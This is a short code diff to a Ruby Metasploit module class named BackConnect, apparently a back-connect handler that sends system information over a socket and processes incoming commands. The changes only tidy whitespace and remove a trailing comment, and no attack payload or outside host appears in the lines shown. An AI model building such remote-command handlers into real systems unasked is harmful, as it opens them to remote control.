@@ -43,7 +43,7 @@ class BackConnect < Msf::Exploit::Remote
       socket.puts "Current Time: #{current_time}"
 
       handle_commands(socket)
-      
+
     rescue ::Exception => e
       print_error("Connection failed: #{e.message}")
     end
@@ -112,7 +112,4 @@ class BackConnect < Msf::Exploit::Remote
   def get_kernel_version
     RUBY_PLATFORM.include?("mswin") ? "Windows Version Unknown" : `uname -r`.strip
   end
-
 end
-
-# Now we would load the exploit class into Metasploit
